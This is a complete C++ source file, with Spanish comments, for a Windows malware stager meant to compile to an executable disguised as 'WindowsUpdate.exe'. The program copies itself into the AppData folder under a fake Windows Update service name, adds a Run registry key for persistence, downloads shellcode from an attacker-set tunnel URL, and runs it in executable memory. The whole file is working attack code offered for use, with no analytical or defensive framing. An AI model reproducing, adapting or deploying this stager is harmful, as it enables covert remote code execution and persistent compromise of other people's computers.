// stager.cpp
// Compilar: cl /nologo /MT /O2 /EHa stager.cpp /Fe:WindowsUpdate.exe ^
//              /link winhttp.lib user32.lib shell32.lib advapi32.lib

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <thread>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================
//  CONFIG — CAMBIA ESTA URL CON LA DE LOCALXPOSE
// ============================================================
static const wchar_t* PAYLOAD_URL =
    L"https://TU-DOMINIO.loclx.io/image.bin";
static const wchar_t* PERSIST_NAME = L"WindowsUpdateSvc";
// ============================================================

// ---------- Descarga HTTP ----------
static std::vector<BYTE> HttpDownload(const std::wstring& url) {
    std::vector<BYTE> out;
    std::wstring host, path;
    INTERNET_PORT port = 80;
    bool https = false;

    size_t p = url.find(L"://");
    if (p == std::wstring::npos) return out;
    if (url.substr(0, 5) == L"https") { https = true; port = 443; }
    p += 3;

    size_t slash = url.find(L'/', p);
    std::wstring hostport = url.substr(p, slash - p);
    path = (slash == std::wstring::npos) ? L"/" : url.substr(slash);

    size_t colon = hostport.find(L':');
    if (colon != std::wstring::npos) {
        port = (INTERNET_PORT)_wtoi(hostport.substr(colon + 1).c_str());
        host = hostport.substr(0, colon);
    } else {
        host = hostport;
    }

    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return out;

    HINTERNET hC = WinHttpConnect(hS, host.c_str(), port, 0);
    if (!hC) { WinHttpCloseHandle(hS); return out; }

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hR = WinHttpOpenRequest(hC, L"GET", path.c_str(), NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hR) { WinHttpCloseHandle(hC); WinHttpCloseHandle(hS); return out; }

    if (WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0) &&
        WinHttpReceiveResponse(hR, 0)) {
        DWORD dwSize = 0;
        do {
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hR, &dwSize)) break;
            if (!dwSize) break;
            size_t off = out.size();
            out.resize(off + dwSize);
            DWORD read = 0;
            if (!WinHttpReadData(hR, out.data() + off, dwSize, &read)) break;
        } while (dwSize > 0);
    }

    WinHttpCloseHandle(hR);
    WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    return out;
}

// ---------- Auto-copia a %APPDATA% ----------
static std::wstring SelfCopyToAppData() {
    wchar_t appdata[MAX_PATH] = {0};
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata)))
        return L"";

    std::wstring dir = std::wstring(appdata) + L"\\Microsoft\\Windows";
    CreateDirectoryW(dir.c_str(), NULL);

    std::wstring dst = dir + L"\\" + PERSIST_NAME + L".exe";

    wchar_t self[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, self, MAX_PATH);

    if (_wcsicmp(self, dst.c_str()) == 0) return dst;
    if (CopyFileW(self, dst.c_str(), FALSE)) return dst;
    return L"";
}

// ---------- Registro Run ----------
static void RegisterRun(const std::wstring& exePath) {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, PERSIST_NAME, 0, REG_SZ,
            (const BYTE*)exePath.c_str(),
            (DWORD)((exePath.length() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

// ---------- Ejecuta shellcode ----------
static void ExecuteInMemory(std::vector<BYTE> sc) {
    if (sc.empty()) return;
    LPVOID mem = VirtualAlloc(NULL, sc.size(),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    memcpy(mem, sc.data(), sc.size());
    ((void(*)())mem)();
}

// ---------- main ----------
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 1. Auto-copia y persistencia
    std::wstring persisted = SelfCopyToAppData();
    if (!persisted.empty()) RegisterRun(persisted);

    // 2. Descargar payload
    std::vector<BYTE> sc = HttpDownload(PAYLOAD_URL);

    // 3. Ejecutar en memoria (en hilo aparte)
    if (!sc.empty()) {
        std::thread(ExecuteInMemory, sc).detach();
    }

    // 4. Mantener vivo
    Sleep(INFINITE);
    return 0;
}